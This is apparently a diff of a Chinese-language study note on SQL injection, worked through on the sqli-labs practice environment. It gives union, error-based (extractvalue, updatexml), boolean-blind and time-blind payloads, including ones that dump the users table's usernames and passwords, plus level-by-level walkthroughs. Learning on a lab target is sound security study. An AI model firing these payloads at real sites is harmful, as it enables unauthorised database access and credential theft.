@@ -581,6 +581,7 @@ $sql=“SELECT * FROM name WHERE id=’$id’ LIMIT 0,1”;
 
 ![QQ_1743235234198](https://github.com/user-attachments/assets/c2dee42d-7eeb-437e-a37c-0c7388b0c6d4)
 
+```
 法一：
 输入id=1\ 分析报错信息：看\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。
 
@@ -610,6 +611,7 @@ $sql=“SELECT * FROM name WHERE id=’$id’ LIMIT 0,1”;
 判断闭合符为：双引号闭合。
 结果2：报错
 判断闭合符可能为：双引号加括号。
+```
 
 **闭合的作用：**
 手工提交闭合符号，结束前一段查询语句
@@ -630,45 +632,67 @@ $sql=“SELECT * FROM name WHERE id=’$id’ LIMIT 0,1”;
 
 #### 总结
 1、查找注入点
+
 2、判断是字符型还是数字型注入and 1=1 1=2/ 3-1
+
 3、如果字符型，找到他的闭合方式，「"./）")
+
 4、判断查询列数，group by或order by
+
 5、查询回显位置，-1
 
 #### 拿到表名和列名
 information_schema() --库名
+
 包含所有mysql数据库的简要信息，其中包含tables（表名集合表）和columns（列名集合表）
+
 tables --表名
+
 table_name --数据列
+
 table_schema 是数据库的名称，找到security的行
+
 table_name 是具体的表名。
+
 table_type 表的类型。
 
+
 group_concat()
+
 确保所有查询信息（所有表）能放到一行显示出来
 
 id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()[即'security']--+
 
 查找数据库security中数据表users的列名
+
 id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+
 
 或者
+
 id=0' union select 1,(需要查询的信息),3--+
+
 #### 查询最终目标
 id=0' union select 1,group_concat(username,'~',password),3 from users--+
 ~用来区分数据
 
 ### Union注入--数字型注入
 1. 确定数字型还是字符型
+
 2. 使用group by的二分法判断union语句中前一个查询的列数
+
 3. 优化语句，将id改为一个不存在的数字
+
 4. 使用select语句，查询靶机数据库库名
+
 5. 使用select语句，查询靶机所有表名
+
 6. 使用select语句，查询靶机所有列名
+
 7. 查询所有用户名密码
 
 ### 报错注入
 通过报错信息获取数据的方法。
+
 用户在前台页面输入检索内容，后台将前台页面上输入的检索内容无加区别的拼接成sql语句，送给数据库执行。数据库将执行的结果返回给后台，后台将数据库执行的结果无加区别的显示到前台页面上。
 
 后台对于输入输出的合理性没有做检查（两个无加区别）
@@ -683,8 +707,11 @@ EXTRACTVALUE(xml_target, xpath_expr)
 如
 select extractvalue(doc,'/book/title') from xml;
 ```
+
 其中xml对象对象名称不重要，可以随便填
+
 关键是将路径前的'/'换为'~'，可以实现报错，显示报错信息，对路径进行修改后，获得我们想要的信息
+
 ```
 select extractvalue(doc,'~book/title') from xml;
 ```
@@ -694,20 +721,32 @@ concat就是将两个内容拼接在一起
 select extractvalue(doc,concat(0x7e,(select database()))) from xml;
 ```
 
+
 在题目中，获得库名
+
 ?id=2' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+
+
 简写为
+
 ?id=2' and 1=extractvalue(1,concat(0x7e,(select database())))--+
 
+
 获得表名
+
 ?id=2' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
 
+
 获得列名
+
 ?id=2' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')))--+
 
+
 获得结果
+
 ?id=2' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,'~',password)from users)))--+
+
 但是extractvalue()回显默认只有32个字符串
+
 
 需要使用函数substring()解决三个参数分别为：字符串、从第几个开始返回、返回几个
 ```
@@ -718,16 +757,118 @@ select substring(123456,4,3)
 返回 456
 ```
 
-将substring()加入，不断修改第二个参数的值去搜索结果
+
+将substring()加入(或者substr())，不断修改第二个参数的值去搜索结果
 ?id=2' and 1=extractvalue(1,concat(0x7e,substring((select group_concat(username,'~',password)from users),1,30)))--+
 
-### 布尔盲注
+#### updatexml() 
+```
+updatexml(xml_document,xpath_string,new_value)
+```
+第一个参数为 xml文档对象名称
+
+第二个参数为 路径（主要作用）
+
+第三个参数为 替换查找到的符合条件的数据
+
+
+报错原理同extractvalue()，输入错误的第二个参数
+?id=1" and 1=updatexml(1,concat(0x7e,(select database())),3)--+
+
+
+其它流程同extractvalue
+
+### 盲注
 盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注、时间盲注、报错盲注
 
-布尔盲注：web页面只返回true真和false假两种类型，利用页面返回不同，逐个猜解数据
-如在sqli-lab less5中
-如果输入id = 1 AND 1=1 会返回you are in 代表为真值
-如果输入id = 1 AND 1=2 不会返回 代表为假值
+#### 布尔盲注（通法，一个一个字母硬试出来）
+web页面只返回true真和false假两种类型，利用页面返回不同，逐个猜解数据
+
+如在sqli-lab less8中
+
+
+如果输入id = 1' and 1=1--+ 会返回you are in 代表为真值
+
+![image](https://github.com/user-attachments/assets/d0a6c621-30b2-44e2-a175-49dc9c272faf)
+
+
+如果输入id = 1' and 1=2--+ 不会返回 代表为假值
+
+![image](https://github.com/user-attachments/assets/7523b6dc-e426-4b43-a1d8-a8c323e87649)
+
+
+只要能使页面出现真假两种情况就能用布尔盲注
+
+**关键函数**
+ascii()
+
+将字母转换成对应数字，查询命令可以执行但不会返回信息
+
+可以使用ascii()把查询到的内容转换成数字，以真假页面来判断字母和其对应的数字是否正确
+
+但是ascii()只能转换第一个字母
+
+所以需要借助函数**substr()**  函数substr((),2,1)从第2个字符开始，显示1个字符（注意有两个括号）
+
+?id=1' and ascii(substr((select database()),1,1))=101 --+
+
+?id=1' and ascii(substr((select database()),1,1))>=101 --+
+
+条件满足，页面显示为真true
+
+使用 **length()**获取长度信息
+
+用?id=1' and (length(database()))>=8--+ 来判断名字的长度
+
+其它步骤可以参考union注入
+
+不同的地方是
+
+?id=1' and ascii(substr((select table_name from information_schema.tables where
+table_schema=database() limit 0,1),1,1))>100 --+
+
+此处没必要使用group_concat()函数，而是使用**limit 0,1**
+
+这个函数的意思是从第0行开始显示1行，从结果的第一行数据依次查询。（同样是改第二个数据）
+
+还有对闭合符的判断
+
+![QQ_1743527662818](https://github.com/user-attachments/assets/289b79f6-f358-4f82-8c0a-2fc4bb8421c9)
+
+#### 时间盲注
+web页面只返回一个正常页面。利用页面相应时间不同，逐个猜解数据
+
+前提是数据库会执行命令代码，只是不反馈页面信息
+
+**关键函数：**
+
+**sleep()**
+
+函数sleep()参数为休眠时长，以秒为单位，可以为小数
+
+(开发者工具中可以查询响应时间)
+
+![image](https://github.com/user-attachments/assets/517b688a-430a-4c2a-b86b-e23dd9d583de)
+
+通过and连接sleep(3)
+
+如输入?id=1 and sleep(3)--+如果耗时3s则代表为数字型注入，反之为字符型
+
+如输入?id=1' and sleep(3)--+如果耗时3s则代表为'闭合，反之则不是
+
+**if()**
+
+select if(a,sleep(0),sleep(3))
+
+意思是如果a为真，则响应0秒钟；如果a为假，则响应3秒钟
+
+结合布尔盲注，可以写出以下指令
+
+?id=1' and if(length(select database())>5,sleep(0),sleep(3))--+
+
+?id=1' and if(ascii(substr((select database()),1,1))>100,sleep(0),sleep(3))--+
+
+...
 
 # sqli_labs
 ## Less-1
@@ -839,7 +980,6 @@ select substring(123456,4,3)
 ## Less-5
 正常去做，发现跟前面的不太一样，查询的信息没有回显，可以选择报错注入或者布尔盲注
 
-
 ![image](https://github.com/user-attachments/assets/cc5a8c1f-e7ae-4a05-8a21-d187977bab31)
 
 首先尝试使用报错注入，判断为'闭合
@@ -874,6 +1014,140 @@ select substring(123456,4,3)
 
 ![image](https://github.com/user-attachments/assets/12cdba56-4b03-4cae-a1ea-2b3833542c1b)
 
-由于时间不够了，等晚一点再补上后面的几道题，先写会高数作业...
+## Less-6
+判断此题为双引号闭合
+
+![image](https://github.com/user-attachments/assets/bf841a94-cda3-4e79-8ba9-0e5fbfd58f38)
+
+获得库名
+
+![image](https://github.com/user-attachments/assets/d96267f3-854f-40d7-8992-ed3c34f67d26)
+
+获得表名
+
+![image](https://github.com/user-attachments/assets/f730313e-8d97-4552-bd8b-717f253f642f)
+
+获得列名
+
+![image](https://github.com/user-attachments/assets/bd780f8d-e356-48fc-874d-7c618045e7ed)
+
+获得目标
+
+![image](https://github.com/user-attachments/assets/93fb9c46-41d5-46ca-9847-cca52f14f0b7)
+
+## Less-7
+这道题发现又不一样，无法显示报错信息了，可以使用布尔盲注
+
+![image](https://github.com/user-attachments/assets/4dc1413c-bb06-4d50-8e43-6abe91b0c3db)
+
+判断闭合方式为'))
+
+![image](https://github.com/user-attachments/assets/0931d233-74ce-419f-9b79-818060d63290)
+
+判断库名长度 长度为8
+
+![image](https://github.com/user-attachments/assets/99524060-aabc-46a0-a5eb-3c1b2314586f)
+
+爆破库名 115 101 99 117 114 105 116 121
+
+![image](https://github.com/user-attachments/assets/89fd443b-59c3-468a-95fe-2525c4a08e62)
+
+爆破表名 117 115 101 114 115
+
+![image](https://github.com/user-attachments/assets/9f4f4c46-9da3-4022-9304-334643126616)
+
+爆破列名
+
+105 100
+
+117 115 101 114 110 97 109 101
+
+112 97 115 115 119 111 114 100
+
+![image](https://github.com/user-attachments/assets/7a8dfd2f-7033-4071-bc1c-4bf083d33ed9)
+
+获得目标......手动注入太繁琐了，之后可以写个脚本
+
+![image](https://github.com/user-attachments/assets/9d441349-8020-4c21-ad98-b5051eee1b34)
+
+## Less-8
+这题也可以用布尔盲注，同上一题
+
+## Less-9
+这题不管真值假值，页面都没有区别，使用时间盲注
+
+![image](https://github.com/user-attachments/assets/373918cf-4fcb-44bd-a390-063e80d7e3a4)
+
+判断闭合方式为'
+
+![image](https://github.com/user-attachments/assets/044b1c2d-ccf7-482d-8253-db0fe2015b6b)
+
+判断库名长度和库的名称
+
+![image](https://github.com/user-attachments/assets/63999686-46ba-4767-9eba-8c4e88a5d23e)
+
+![image](https://github.com/user-attachments/assets/efb47776-e763-45c3-b0a2-1461856f5a52)
+
+后面同布尔盲注
+
+![image](https://github.com/user-attachments/assets/d7fbb735-c6ae-4ffd-bb2c-c5557d9a54ae)
 
 
+...
+
+## Less-10
+同第九题，用时间盲注即可，只需要将闭合方式改为双引号"
+
+![image](https://github.com/user-attachments/assets/23f2770d-d887-40ca-b16e-f04a8a9eaee2)
+
+## Less-11
+这关发现页面改变了，变成账户登录页面，注入点就在输入框里面，即使用post请求提交表单
+
+![image](https://github.com/user-attachments/assets/6fed38d3-9519-46d1-b6a4-793fb0352ba6)
+
+得到闭合方式为单引号',且该sql语句为username='参数' and password='参数'
+
+![image](https://github.com/user-attachments/assets/073ca6b5-5f2d-4a5c-9e6b-686274eaf829)
+
+这里我们使用--+注释就不行，需要换成#来注释
+
+判断出来为两列，由于没有id列所以查询的数字随便填都可以
+
+![image](https://github.com/user-attachments/assets/03487f24-48e1-4c47-b963-4d1442a86f23)
+
+![image](https://github.com/user-attachments/assets/67d657bb-97c2-43d4-8852-5017723ae5ca)
+
+后面就同第一题了
+
+![image](https://github.com/user-attachments/assets/abf0ecc2-1bd9-458e-bc0f-3ad15fef35b4)
+
+![image](https://github.com/user-attachments/assets/57b2286b-1fde-4726-b17b-e80eaeaaf06b)
+
+![image](https://github.com/user-attachments/assets/50ae0f4a-a88f-48c6-88e4-a2e11f4c3ad7)
+
+![image](https://github.com/user-attachments/assets/b08c20b6-f831-4630-8578-4b21cfa129de)
+
+## Less-12
+得到以")闭合，其它都同上一题
+
+![image](https://github.com/user-attachments/assets/d3ee6991-c17b-4080-8280-c3d1a592cab6)
+
+## Less-13
+以')闭合，其它都同第11题
+
+![image](https://github.com/user-attachments/assets/4725aeba-bc54-4d4b-9252-fbdba3a08e77)
+
+## Less-14
+以"闭合，其它都同第11题
+
+![image](https://github.com/user-attachments/assets/2bb5a73b-f50f-4916-85a8-75f67d81232c)
+
+## Less-15
+这关需要用布尔盲注，参考第7题，闭合方式为单引号'
+
+![image](https://github.com/user-attachments/assets/e1c9522f-39ec-4594-bde0-c2b4bc6fedeb)
+
+## Less-16
+这关也是布尔盲注，闭合方式为")
+
+![image](https://github.com/user-attachments/assets/20ec3d61-4dd0-4e31-83d1-70a945fbc442)
